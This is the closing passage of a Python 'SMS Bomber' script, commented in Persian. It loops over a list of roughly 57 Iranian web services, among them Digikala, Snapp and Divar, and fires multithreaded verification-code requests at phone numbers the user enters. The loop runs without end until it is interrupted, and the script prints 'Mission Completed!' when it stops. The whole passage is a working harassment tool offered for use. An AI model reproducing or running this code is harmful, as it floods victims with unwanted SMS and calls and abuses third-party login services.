            print(f'{g}(banimode) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (banimode) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] banimode Exception: {e}{a}')
        return False
        


        
# ==========================
# لیست سرویس‌ها (می‌توانی همه سرویس‌های V4 را اضافه کنی)
# ==========================

services = [
    achareh, alibaba, alldigitall, alopeyk_safir, angeliran,
    Balad, banimode, barghman, Besparto, bimebazar,
    bodoroj, candom_shop, Charsooq, dgshahr, digikala,
    DigikalaJet, divar, drnext, elanza, gap,
    ghasedak24, hajamooo, ilozi, katonikhan, katoonistore,
    komodaa, Koohshid, mahabadperfume, malltina, mek,
    missomister, mo7_ir, mobilex, mootanroo, mrbilit,
    niktakala, Okala, okorosh, paklean_call,
    payonshoes, pindo, ragham_call, riiha, Sandalestan,
    shahrfarsh, ShahreSandal, snap, snapp_market, snappshop,
    sibapp, tapsi_food, tetherland, theshoes, torobpay,
    trip, trip_call, vitrin_shop
]


# ==========================
# تابع VIP مولتی‌تردینگ
# ==========================
def vip(phones, delay=0.1):
    print(f"{g}Targets: {y}{', '.join(phones)}{a}")
    print(f"{g}Services Loaded: {y}{len(services)}{a}")
    print(f"{g}Delay: {y}{delay}s{a}")
    try:
        while True:
            for phone in phones:
                for service in services:
                    Thread(target=send_service_safe, args=(service, phone)).start()
                    sleep(delay)
    except KeyboardInterrupt:
        print(f"{g}[+] Mission Completed!{a}")

# ==========================
# منوی اصلی
# ==========================
def main_menu():
    print(f"""
{y}╔════════════════════════════════════════════╗
{g}║         SMS Bomber by M.M.]R               ║
{y}╚════════════════════════════════════════════╝
{g} Coded by: {r}M.M.]R{a}
{y}══════════════════════════════════════════════
{g} Services Loaded: {y}{len(services)}{a}
{g} Enter phone numbers (separated by - for multiple):
{a} Example: +989123456789-+989987654321
{y}══════════════════════════════════════════════
""")

# ==========================
# نقطه ورود
# ==========================
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection!{a}")
    else:
        main_menu()
        phones = None
        while not phones:
            phone_input = input(f'{g}[?] Enter Phone(s) (+98): {a}')
            phones = is_phone(phone_input)
            if not phones:
                print(f"{r}[-] No valid phones entered!{a}")
        try:
            delay = float(input(f'{g}[?] Delay (seconds) [Default=0.1]: {a}') or 0.1)
        except ValueError:
            delay = 0.1
        vip(phones, delay)
